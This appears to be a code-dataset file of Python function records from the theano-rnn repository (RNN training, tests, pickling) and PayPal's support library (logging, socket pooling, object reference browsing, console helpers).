{"docstring": "\"\"\" Load the dataset into shared variables \"\"\"\n\n", "func_signal": "def shared_dataset(self, data_xy, borrow=True):\n", "code": "data_x, data_y = data_xy\nshared_x = theano.shared(np.asarray(data_x,\n                                    dtype=theano.config.floatX),\n                         borrow=True)\n\nshared_y = theano.shared(np.asarray(data_y,\n                                    dtype=theano.config.floatX),\n                         borrow=True)\n\nif self.output_type in ('binary', 'softmax'):\n    return shared_x, T.cast(shared_y, 'int32')\nelse:\n    return shared_x, shared_y", "path": "rnn_minibatch.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Test RNN with real-valued outputs. \"\"\"\n", "func_signal": "def test_real(n_updates=100):\n", "code": "n_hidden = 10\nn_in = 5\nn_out = 3\nn_steps = 10\nn_seq = 1000\n\nnp.random.seed(0)\n# simple lag test\nseq = np.random.randn(n_seq, n_steps, n_in)\n\ntargets = np.zeros((n_seq, n_steps, n_out))\ntargets[:, 1:, 0] = seq[:, :-1, 3]  # delayed 1\ntargets[:, 1:, 1] = seq[:, :-1, 2]  # delayed 1\ntargets[:, 2:, 2] = seq[:, :-2, 0]  # delayed 2\n\ntargets += 0.01 * np.random.standard_normal(targets.shape)\n\n# SequenceDataset wants a list of sequences\n# this allows them to be different lengths, but here they're not\nseq = [i for i in seq]\ntargets = [i for i in targets]\n\ngradient_dataset = SequenceDataset([seq, targets], batch_size=None,\n                                   number_batches=100)\ncg_dataset = SequenceDataset([seq, targets], batch_size=None,\n                             number_batches=20)\n\nmodel = MetaRNN(n_in=n_in, n_hidden=n_hidden, n_out=n_out,\n                activation='tanh')\n\nopt = hf_optimizer(p=model.rnn.params, inputs=[model.x, model.y],\n                   s=model.rnn.y_pred,\n                   costs=[model.rnn.loss(model.y)], h=model.rnn.h)\n\nopt.train(gradient_dataset, cg_dataset, num_updates=n_updates)\n\nplt.close('all')\nfig = plt.figure()\nax1 = plt.subplot(211)\nplt.plot(seq[0])\nax1.set_title('input')\nax2 = plt.subplot(212)\ntrue_targets = plt.plot(targets[0])\n\nguess = model.predict(seq[0])\nguessed_targets = plt.plot(guess, linestyle='--')\nfor i, x in enumerate(guessed_targets):\n    x.set_color(true_targets[i].get_color())\nax2.set_title('solid: true output, dashed: model output')", "path": "hf_example.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Test RNN with real-valued outputs. \"\"\"\n", "func_signal": "def test_real(n_epochs=1000):\n", "code": "n_hidden = 10\nn_in = 5\nn_out = 3\nn_steps = 10\nn_seq = 10  # per batch\nn_batches = 10\n\nnp.random.seed(0)\n# simple lag test\nseq = np.random.randn(n_steps, n_seq * n_batches, n_in)\ntargets = np.zeros((n_steps, n_seq * n_batches, n_out))\n\ntargets[1:, :, 0] = seq[:-1, :, 3]  # delayed 1\ntargets[1:, :, 1] = seq[:-1, :, 2]  # delayed 1\ntargets[2:, :, 2] = seq[:-2, :, 0]  # delayed 2\n\ntargets += 0.01 * np.random.standard_normal(targets.shape)\n\nmodel = MetaRNN(n_in=n_in, n_hidden=n_hidden, n_out=n_out,\n                learning_rate=0.01, learning_rate_decay=0.999,\n                n_epochs=n_epochs, batch_size=n_seq, activation='tanh',\n                L2_reg=1e-3)\n\nmodel.fit(seq, targets, validate_every=100, optimizer='bfgs')\n\nplt.close('all')\nfig = plt.figure()\nax1 = plt.subplot(211)\nplt.plot(seq[:, 0, :])\nax1.set_title('input')\nax2 = plt.subplot(212)\ntrue_targets = plt.plot(targets[:, 0, :])\n\nguess = model.predict(seq[:, 0, :][:, np.newaxis, :])\n\nguessed_targets = plt.plot(guess.squeeze(), linestyle='--')\nfor i, x in enumerate(guessed_targets):\n    x.set_color(true_targets[i].get_color())\nax2.set_title('solid: true output, dashed: model output')", "path": "rnn_minibatch.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Save a pickled representation of Model state. \"\"\"\n", "func_signal": "def save(self, fpath='.', fname=None):\n", "code": "fpathstart, fpathext = os.path.splitext(fpath)\nif fpathext == '.pkl':\n    # User supplied an absolute path to a pickle file\n    fpath, fname = os.path.split(fpath)\n\nelif fname is None:\n    # Generate filename based on date\n    date_obj = datetime.datetime.now()\n    date_str = date_obj.strftime('%Y-%m-%d-%H:%M:%S')\n    class_name = self.__class__.__name__\n    fname = '%s.%s.pkl' % (class_name, date_str)\n\nfabspath = os.path.join(fpath, fname)\n\nlogger.info(\"Saving to %s ...\" % fabspath)\nfile = open(fabspath, 'wb')\nstate = self.__getstate__()\npickle.dump(state, file, protocol=pickle.HIGHEST_PROTOCOL)\nfile.close()", "path": "rnn.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Load the dataset into shared variables \"\"\"\n\n", "func_signal": "def shared_dataset(self, data_xy):\n", "code": "data_x, data_y = data_xy\nshared_x = theano.shared(np.asarray(data_x,\n                                    dtype=theano.config.floatX))\n\nshared_y = theano.shared(np.asarray(data_y,\n                                    dtype=theano.config.floatX))\n\nif self.output_type in ('binary', 'softmax'):\n    return shared_x, T.cast(shared_y, 'int32')\nelse:\n    return shared_x, shared_y", "path": "rnn.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "# negative log likelihood based on multiclass cross entropy error\n#\n# Theano's advanced indexing is limited\n# therefore we reshape our n_steps x n_seq x n_classes tensor3 of probs\n# to a (n_steps * n_seq) x n_classes matrix of probs\n# so that we can use advanced indexing (i.e. get the probs which\n# correspond to the true class)\n# the labels y also must be flattened when we do this to use the\n# advanced indexing\n", "func_signal": "def nll_multiclass(self, y):\n", "code": "p_y = self.p_y_given_x\np_y_m = T.reshape(p_y, (p_y.shape[0] * p_y.shape[1], -1))\ny_f = y.flatten(ndim=1)\nreturn -T.mean(T.log(p_y_m)[T.arange(p_y_m.shape[0]), y_f])", "path": "rnn_minibatch.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "# input (where first dimension is time)\n", "func_signal": "def ready(self):\n", "code": "self.x = T.matrix()\n# target (where first dimension is time)\nif self.output_type == 'real':\n    self.y = T.matrix(name='y', dtype=theano.config.floatX)\nelif self.output_type == 'binary':\n    self.y = T.matrix(name='y', dtype='int32')\nelif self.output_type == 'softmax':  # only vector labels supported\n    self.y = T.vector(name='y', dtype='int32')\nelse:\n    raise NotImplementedError\n# initial hidden state of the RNN\nself.h0 = T.vector()\n# learning rate\nself.lr = T.scalar()\n\nif self.activation == 'tanh':\n    activation = T.tanh\nelif self.activation == 'sigmoid':\n    activation = T.nnet.sigmoid\nelif self.activation == 'relu':\n    activation = lambda x: x * (x > 0)\nelif self.activation == 'cappedrelu':\n    activation = lambda x: T.minimum(x * (x > 0), 6)\nelse:\n    raise NotImplementedError\n\nself.rnn = RNN(input=self.x, n_in=self.n_in,\n               n_hidden=self.n_hidden, n_out=self.n_out,\n               activation=activation, output_type=self.output_type,\n               use_symbolic_softmax=self.use_symbolic_softmax)\n\nif self.output_type == 'real':\n    self.predict = theano.function(inputs=[self.x, ],\n                                   outputs=self.rnn.y_pred,\n                                   mode=mode)\nelif self.output_type == 'binary':\n    self.predict_proba = theano.function(inputs=[self.x, ],\n                        outputs=self.rnn.p_y_given_x, mode=mode)\n    self.predict = theano.function(inputs=[self.x, ],\n                        outputs=T.round(self.rnn.p_y_given_x),\n                        mode=mode)\nelif self.output_type == 'softmax':\n    self.predict_proba = theano.function(inputs=[self.x, ],\n                outputs=self.rnn.p_y_given_x, mode=mode)\n    self.predict = theano.function(inputs=[self.x, ],\n                        outputs=self.rnn.y_out, mode=mode)\nelse:\n    raise NotImplementedError", "path": "rnn.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Test RNN with softmax outputs. \"\"\"\n", "func_signal": "def test_softmax(n_epochs=250, optimizer='cg'):\n", "code": "n_hidden = 10\nn_in = 5\nn_steps = 10\nn_seq = 10  # per batch\nn_batches = 50\nn_classes = 3\nn_out = n_classes  # restricted to single softmax per time step\n\nnp.random.seed(0)\n# simple lag test\nseq = np.random.randn(n_steps, n_seq * n_batches, n_in)\ntargets = np.zeros((n_steps, n_seq * n_batches), dtype=np.int)\n\nthresh = 0.5\n# if lag 1 (dim 3) is greater than lag 2 (dim 0) + thresh\n# class 1\n# if lag 1 (dim 3) is less than lag 2 (dim 0) - thresh\n# class 2\n# if lag 2(dim0) - thresh <= lag 1 (dim 3) <= lag2(dim0) + thresh\n# class 0\ntargets[2:, :][seq[1:-1, :, 3] > seq[:-2, :, 0] + thresh] = 1\ntargets[2:, :][seq[1:-1, :, 3] < seq[:-2, :, 0] - thresh] = 2\n#targets[:, 2:, 0] = np.cast[np.int](seq[:, 1:-1, 3] > seq[:, :-2, 0])\n\nmodel = MetaRNN(n_in=n_in, n_hidden=n_hidden, n_out=n_out,\n                learning_rate=0.005, learning_rate_decay=0.999,\n                n_epochs=n_epochs, batch_size=n_seq, activation='tanh',\n                output_type='softmax')\n\nmodel.fit(seq, targets, validate_every=10, compute_zero_one=True,\n          optimizer=optimizer)\n\nseqs = xrange(10)\n\nplt.close('all')\nfor seq_num in seqs:\n    fig = plt.figure()\n    ax1 = plt.subplot(211)\n    plt.plot(seq[:, seq_num])\n    ax1.set_title('input')\n    ax2 = plt.subplot(212)\n\n    # blue line will represent true classes\n    true_targets = plt.step(xrange(n_steps), targets[:, seq_num],\n                            marker='o')\n\n    # show probabilities (in b/w) output by model\n    guess = model.predict_proba(seq[:, seq_num][:, np.newaxis])\n    guessed_probs = plt.imshow(guess.squeeze().T, interpolation='nearest',\n                               cmap='gray')\n    ax2.set_title('blue: true class, grayscale: probs assigned by model')", "path": "rnn_minibatch.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Test RNN with softmax outputs. \"\"\"\n", "func_signal": "def test_softmax(n_epochs=250):\n", "code": "n_hidden = 10\nn_in = 5\nn_steps = 10\nn_seq = 100\nn_classes = 3\nn_out = n_classes  # restricted to single softmax per time step\n\nnp.random.seed(0)\n# simple lag test\nseq = np.random.randn(n_seq, n_steps, n_in)\ntargets = np.zeros((n_seq, n_steps), dtype=np.int)\n\nthresh = 0.5\n# if lag 1 (dim 3) is greater than lag 2 (dim 0) + thresh\n# class 1\n# if lag 1 (dim 3) is less than lag 2 (dim 0) - thresh\n# class 2\n# if lag 2(dim0) - thresh <= lag 1 (dim 3) <= lag2(dim0) + thresh\n# class 0\ntargets[:, 2:][seq[:, 1:-1, 3] > seq[:, :-2, 0] + thresh] = 1\ntargets[:, 2:][seq[:, 1:-1, 3] < seq[:, :-2, 0] - thresh] = 2\n#targets[:, 2:, 0] = np.cast[np.int](seq[:, 1:-1, 3] > seq[:, :-2, 0])\n\nmodel = MetaRNN(n_in=n_in, n_hidden=n_hidden, n_out=n_out,\n                learning_rate=0.001, learning_rate_decay=0.999,\n                n_epochs=n_epochs, activation='tanh',\n                output_type='softmax', use_symbolic_softmax=False)\n\nmodel.fit(seq, targets, validation_frequency=1000)\n\nseqs = xrange(10)\n\nplt.close('all')\nfor seq_num in seqs:\n    fig = plt.figure()\n    ax1 = plt.subplot(211)\n    plt.plot(seq[seq_num])\n    ax1.set_title('input')\n    ax2 = plt.subplot(212)\n\n    # blue line will represent true classes\n    true_targets = plt.step(xrange(n_steps), targets[seq_num], marker='o')\n\n    # show probabilities (in b/w) output by model\n    guess = model.predict_proba(seq[seq_num])\n    guessed_probs = plt.imshow(guess.T, interpolation='nearest',\n                               cmap='gray')\n    ax2.set_title('blue: true class, grayscale: probs assigned by model')", "path": "rnn.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Save a pickled representation of Model state. \"\"\"\n", "func_signal": "def save(self, fpath='.', fname=None):\n", "code": "fpathstart, fpathext = os.path.splitext(fpath)\nif fpathext == '.pkl':\n    # User supplied an absolute path to a pickle file\n    fpath, fname = os.path.split(fpath)\n\nelif fname is None:\n    # Generate filename based on date\n    date_obj = datetime.datetime.now()\n    date_str = date_obj.strftime('%Y-%m-%d-%H:%M:%S')\n    class_name = self.__class__.__name__\n    fname = '%s.%s.pkl' % (class_name, date_str)\n\nfabspath = os.path.join(fpath, fname)\n\nlogger.info(\"Saving to %s ...\" % fabspath)\nfile = open(fabspath, 'wb')\nstate = self.__getstate__()\npickle.dump(state, file, protocol=pickle.HIGHEST_PROTOCOL)\nfile.close()", "path": "rnn_minibatch.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Return state sequence.\"\"\"\n", "func_signal": "def __getstate__(self):\n", "code": "params = self._get_params()  # parameters set in constructor\ntheta = self.rnn.theta.get_value()\nstate = (params, theta)\nreturn state", "path": "rnn_minibatch.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Set parameters from state sequence.\n\nParameters must be in the order defined by self.params:\n    W, W_in, W_out, h0, bh, by\n\"\"\"\n", "func_signal": "def __setstate__(self, state):\n", "code": "params, weights = state\nself.set_params(**params)\nself.ready()\nself._set_weights(weights)", "path": "rnn.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "# input (where first dimension is time)\n", "func_signal": "def ready(self):\n", "code": "self.x = T.tensor3(name='x')\n# target (where first dimension is time)\nif self.output_type == 'real':\n    self.y = T.tensor3(name='y', dtype=theano.config.floatX)\nelif self.output_type == 'binary':\n    self.y = T.tensor3(name='y', dtype='int32')\nelif self.output_type == 'softmax':  # now it is a matrix (T x n_seq)\n    self.y = T.matrix(name='y', dtype='int32')\nelse:\n    raise NotImplementedError\n\n# learning rate\nself.lr = T.scalar()\n\nif self.activation == 'tanh':\n    activation = T.tanh\nelif self.activation == 'sigmoid':\n    activation = T.nnet.sigmoid\nelif self.activation == 'relu':\n    activation = lambda x: x * (x > 0)\nelif self.activation == 'cappedrelu':\n    activation = lambda x: T.minimum(x * (x > 0), 6)\nelse:\n    raise NotImplementedError\n\nself.rnn = RNN(input=self.x, n_in=self.n_in,\n               n_hidden=self.n_hidden, n_out=self.n_out,\n               activation=activation, output_type=self.output_type)\n\nif self.output_type == 'real':\n    self.predict = theano.function(inputs=[self.x, ],\n                                   outputs=self.rnn.y_pred,\n                                   mode=mode)\nelif self.output_type == 'binary':\n    self.predict_proba = theano.function(inputs=[self.x, ],\n                        outputs=self.rnn.p_y_given_x, mode=mode)\n    self.predict = theano.function(inputs=[self.x, ],\n                        outputs=T.round(self.rnn.p_y_given_x),\n                        mode=mode)\nelif self.output_type == 'softmax':\n    self.predict_proba = theano.function(inputs=[self.x, ],\n                outputs=self.rnn.p_y_given_x, mode=mode)\n    self.predict = theano.function(inputs=[self.x, ],\n                        outputs=self.rnn.y_out, mode=mode)\nelse:\n    raise NotImplementedError", "path": "rnn_minibatch.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Load model parameters from path. \"\"\"\n", "func_signal": "def load(self, path):\n", "code": "logger.info(\"Loading from %s ...\" % path)\nfile = open(path, 'rb')\nstate = pickle.load(file)\nself.__setstate__(state)\nfile.close()", "path": "rnn.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Produces some debugging output. \"\"\"\n", "func_signal": "def optional_output(self, train_set_x, show_norms=True, show_output=True):\n", "code": "if show_norms:\n    norm_output = []\n    for param in self.rnn.params:\n        norm_output.append('%s: %6.4f' % (param.name,\n                                           self.get_norms[param]()))\n    logger.info(\"norms: {\" + ', '.join(norm_output) + \"}\")\n\nif show_output:\n    # show output for a single case\n    if self.output_type == 'binary':\n        output_fn = self.predict_proba\n    else:\n        output_fn = self.predict\n    logger.info(\"sample output: \" + \\\n            str(output_fn(train_set_x.get_value(\n                borrow=True)[:, 0, :][:, np.newaxis, :]).flatten()))", "path": "rnn_minibatch.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\"Return a float representing the number of errors in the sequence\nover the total number of examples in the sequence ; zero one\nloss over the size of the sequence\n\n:type y: theano.tensor.TensorType\n:param y: corresponds to a vector that gives for each example the\n          correct label\n\"\"\"\n# check if y has same dimension of y_pred\n", "func_signal": "def errors(self, y):\n", "code": "if y.ndim != self.y_out.ndim:\n    raise TypeError('y should have the same shape as self.y_out',\n        ('y', y.type, 'y_out', self.y_out.type))\n\nif self.output_type in ('binary', 'softmax'):\n    # check if y is of the correct datatype\n    if y.dtype.startswith('int'):\n        # the T.neq operator returns a vector of 0s and 1s, where 1\n        # represents a mistake in prediction\n        return T.mean(T.neq(self.y_out, y))\n    else:\n        raise NotImplementedError()", "path": "rnn.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Load model parameters from path. \"\"\"\n", "func_signal": "def load(self, path):\n", "code": "logger.info(\"Loading from %s ...\" % path)\nfile = open(path, 'rb')\nstate = pickle.load(file)\nself.__setstate__(state)\nfile.close()", "path": "rnn_minibatch.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\"Log only with -dd\"\"\"\n", "func_signal": "def log_debug2(self, *args, **kw):\n", "code": "log_msgs[self.caller_mod + \"--\" + args[0]] += 1\nif self.trace_mod or _log_level >= 2:\n    import gevent  # for getcurrent\n    try:\n        msg = apply(args[0].format, tuple(args[1:]))\n        print >> the_file, \"%s %s D2 (%s):%s\" % (datetime.now().strftime(\"%d/%H:%M:%S.%f\"),\n                                                 self.caller_mod, id(gevent.getcurrent()),\n                                                 self.tag), msg\n    except:\n        log_failure(args[0])", "path": "support\\ll.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "\"\"\"Log only with -dddd\"\"\"\n", "func_signal": "def log_debug4(self, *args, **kw):\n", "code": "global log_msgs\nlog_msgs[self.caller_mod + \"--\" + args[0]] += 1\nif self.trace_mod or _log_level >= 4:\n    import gevent  # for getcurrent\n    try:\n        msg = apply(args[0].format, tuple(args[1:]))\n        print >> the_file, \"%s %s D4 (%s):%s\" % (datetime.now().strftime(\"%d/%H:%M:%S.%f\"),\n                                                 self.caller_mod, id(gevent.getcurrent()),\n                                                 self.tag), msg\n    except:\n        log_failure(args[0])", "path": "support\\ll.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "\"\"\"Set global low lovel log level\"\"\"\n", "func_signal": "def set_log_level(level):\n", "code": "global _log_level\nif level is None:\n    level = 0\nlevel = max(level, LOG_LEVELS['NEVER'])\nlevel = min(level, LOG_LEVELS['DEBUG4'])\n_log_level = level", "path": "support\\ll.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "\"\"\"Use a file instead of stdout\n   Relative to cwd unless starts with /\"\"\"\n", "func_signal": "def use_the_file(name=\"lll.txt\"):\n", "code": "global the_file\nif name[0] == \"/\":\n    path = name\nelse:\n    path = os.getcwd() + \"/./\" + name\nthe_file = open(path, \"a\")", "path": "support\\ll.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "#return a free socket, if one is availble; else None\n", "func_signal": "def acquire(self, addr):\n", "code": "try:\n    self.cull()\nexcept Exception as e:  # never bother caller with cull problems\n    ml.ld(\"Exception from cull: {0!r}\", e)\nsocks = self.free_socks_by_addr.get(addr)\nif socks:\n    sock = socks.pop()\n    del self.sock_idle_times[sock]\n    try:  # sock.fileno() will throw if EBADF\n        ml.ld(\"Acquiring sock {0}/FD {1}\", str(id(sock)), str(sock.fileno()))\n    except:\n        pass\n    return sock\nreturn None", "path": "support\\socket_pool.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "'''\nReturn a list [ (key, ref), (key, ref), ...]\nWhere key is a string representing how the passed\nobj references the object ref.\n'''\n", "func_signal": "def get_referree_key_obj_list(obj):\n", "code": "key_obj_map = {}\n# dict-like things\ntry:\n    for k in obj.keys():\n        key_obj_map[\"[\" + tolabel(k) + \"]\"] = obj[k]\nexcept:\n    pass\n# list-like things\ntry:\n    for i in range(len(obj)):\n        key_obj_map[\"[\" + tolabel(i) + \"]\"] = obj[k]\nexcept:\n    pass\n# object-like things\ntry:\n    key_obj_map.update(obj.__dict__)\nexcept:\n    pass\nreturn sorted(key_obj_map.items())", "path": "support\\meta_service\\obj_browser.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "'''\nWraps base runcode to put displayhook around it.\nTODO: add a new displayhook dispatcher so that the\ncurrent SockConsole is a greenlet-tree local.\n(In case the statement being executed itself\ncauses greenlet switches.)\n'''\n", "func_signal": "def runcode(self, _code):\n", "code": "prev = sys.displayhook\nsys.displayhook = self._display_hook\nself._last = None\ncode.InteractiveConsole.runcode(self, _code)\nsys.displayhook = prev\nif self._last is not None:\n    self.write(self._last)", "path": "support\\group.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "#this is also a way of \"registering\" a socket with the pool\n#basically, this says \"I'm done with this socket, make it available for anyone else\"\n", "func_signal": "def release(self, sock):\n", "code": "try:  # sock.fileno() will throw if EBADF\n    ml.ld(\"Releasing sock {0} /FD {1}\", str(id(sock)), str(sock.fileno()))\nexcept:\n    pass\ntry:\n    if select.select([sock], [], [], 0)[0]:\n        self.killsock(sock)\n        return #TODO: raise exception when handed messed up socket?\n        #socket is readable means one of two things:\n        #1- left in a bad state (e.g. more data waiting -- protocol state is messed up)\n        #2- socket closed by remote (in which case read will return empty string)\nexcept:\n    return #if socket was closed, select will raise socket.error('Bad file descriptor')\naddr = sock.getpeername()\naddr_socks = self.free_socks_by_addr.setdefault(addr, [])\nself.total_sockets += 1\nself.sock_idle_times[sock] = time.time()\naddr_socks.append(sock)\nself.reduce_addr_size(addr, self.max_socks_by_addr.get(addr, self.default_max_socks_per_addr))\nself.reduce_size(self.max_sockets)", "path": "support\\socket_pool.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "'''\nReturn a list [ (key, ref), (key, ref), ...]\nWhere key is a string representing how the object\nref references the passed obj.\n'''\n", "func_signal": "def get_referrer_key_obj_list(obj):\n", "code": "gc.collect()\nrefs = gc.get_referrers(obj)\nkey_obj_list = []\nfor e in refs:\n    key = None\n    if isinstance(e, dict):\n        key = \"[\" + repr(keyof(e, obj)) + \"]\"\n    elif isinstance(e, (list, tuple)):\n        try:\n            key = \"[\" + repr(e.index(obj)) + \"]\"\n        except ValueError:\n            pass\n    elif isinstance(e, types.FrameType):\n        key = keyof(e.f_locals, obj) or keyof(e.f_globals, obj)\n    elif isinstance(e, types.MethodType):\n        key = keyof({\n            \"im_class\": e.im_class,\n            \"im_func\": e.im_func,\n            \"im_self\": e.im_self\n        }, obj)\n    elif hasattr(e, '__dict__'):\n        key = keyof(e.__dict__, obj)\n    # if all else has failed...\n    if type(e) is obj:\n        key = '__class__'\n    key_obj_list.append((key, e))\nreturn key_obj_list", "path": "support\\meta_service\\obj_browser.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "# the watcher greenlet\n", "func_signal": "def _make_waiter(self, callback):\n", "code": "def waiter():\n    while self.running:\n        ml.ld('Thread connection consumer greenlet waiting')\n        ml2.info('thread_consumer').success('waiting')\n        self.event.clear()\n        self.event.wait()\n        ml2.info('thread_consumer').success('woke up')\n        ml.ld('Thread connection consumer greenlet woke up')\n\n        while self.queue and self.running:\n            callback()\n            gevent.sleep(0)\n\nreturn waiter", "path": "support\\group.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "'''\nreduce the number of sockets pooled on the specified address to size\nreturns a greenlet that can be joined on to wait for all sockets to close\n'''\n", "func_signal": "def reduce_addr_size(self, addr, size):\n", "code": "addr_socks = self.free_socks_by_addr.get(addr, [])\nif len(addr_socks) <= size:\n    return\nnum_culling = len(addr_socks) - size\nculled = sorted([(self.sock_idle_times[e], e) for e in addr_socks])[-num_culling:]\nself.total_sockets -= num_culling\nreturn [self._remove_sock(e[1]) for e in culled]", "path": "support\\socket_pool.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "# TODO: revisit this with newer gevent release\n", "func_signal": "def _post_fork(self):\n", "code": "hub = gevent.hub.get_hub()\nhub.loop.reinit()  # reinitializes libev\nhub._threadpool = None  # eliminate gevent's internal threadpools\ngevent.sleep(0)  # let greenlets run\n# finally, eliminate our threadpools\nctx = context.get_context()\nctx.thread_locals = threading.local()\n# do not print logs failures -- they are in stats\nctx.log_failure_print = False\nif self.daemonize:\n    ll.use_std_out()\nif ctx.sampling:\n    ctx.set_sampling(False)\n    ctx.set_sampling(True)\n\nif self.post_fork:\n    self.post_fork()\nmsg = 'successfully started process {pid}'\nctx.log.critical('WORKER', 'START').success(msg, pid=os.getpid())\nif self.trace_in_child:  # re-enable tracing LONG SPIN detection\n    ctx.set_greenlet_trace(True)  # if it was enabled before forking\nself.start()", "path": "support\\group.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "# TODO: also yield app/handler?\n", "func_signal": "def iter_addresses(self):\n", "code": "for wsgi_app, address, ssl_ctx in self.wsgi_apps:\n    yield address\nfor handler, address in self.stream_handlers:\n    yield address\nfor server, address in self.custom_servers:\n    yield address", "path": "support\\group.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "\"\"\"Use stdout instead of a file - just for tests\"\"\"\n", "func_signal": "def use_std_out():\n", "code": "global the_file\nthe_file = sys.stdout", "path": "support\\ll.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "#cull sockets which are in a bad state\n", "func_signal": "def cull(self):\n", "code": "culled = []\nself.total_sockets = 0\n#sort the living from the soon-to-be-dead\nfor addr in self.free_socks_by_addr:\n    live = []\n    # STEP 1 - CULL IDLE SOCKETS\n    for sock in self.free_socks_by_addr[addr]:\n        # in case the socket does not have an entry in sock_idle_times,\n        # assume the socket is very old and cull\n        if time.time() - self.sock_idle_times.get(sock, 0) > self.timeout:\n            try:\n                ml.ld(\"Going to Close sock {{{0}}}/FD {1}\",\n                      id(sock), sock.fileno())\n            except:\n                pass\n            culled.append(sock)\n        else:\n            try:  # check that the underlying fileno still exists\n                sock.fileno()\n                live.append(sock)\n            except socket.error:\n                pass  # if no fileno, the socket is dead and no need to close it\n    # STEP 2 - CULL READABLE SOCKETS\n    if live:  # (if live is [], select.select() would error)\n        readable = set(select.select(live, [], [], 0)[0])\n        # if a socket is readable that means one of two bad things:\n        # 1- the socket has been closed (and sock.recv() would return '')\n        # 2- the server has sent some data which no client has claimed\n        #       (which will remain in the recv buffer and mess up the next client)\n        live = [s for s in live if s not in readable]\n        culled.extend(readable)\n    self.free_socks_by_addr[addr] = live\n    self.total_sockets += len(live)\n# shutdown all the culled sockets\nfor sock in culled:\n    del self.sock_idle_times[sock]\n    gevent.spawn(self.killsock, sock)", "path": "support\\socket_pool.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "'''\nFind all of the frames which the object is referenced in.\nReturn a list [(name, frame), (name, frame) ... ]\n'''\n", "func_signal": "def get_frames_local_to(obj):\n", "code": "import types\nrefs = gc.get_referrers(obj)\nframe_refs = []\nfor f in refs:\n    if not isinstance(f, types.FrameType):\n        continue\n    if f.f_code.co_filename == __file__:\n        continue  # skip references to this file\n    for k, v in f.f_locals.items():\n        if v is obj:\n            frame_refs.append((k, f))\nreturn frame_refs", "path": "support\\meta_service\\meta_service.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "'''\nHandle an item returned from the exec statement.\n'''\n", "func_signal": "def _display_hook(self, obj):\n", "code": "self._last = \"\"\nif obj is None:\n    return\nself.locals['_'] = None\n# clean up output by adding \\n here; so you don't see \"hello world!\">>>\n# TODO: is there a better way to handle this?\nself._last = repr(obj) + \"\\n\"\nself.locals['_'] = obj", "path": "support\\group.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
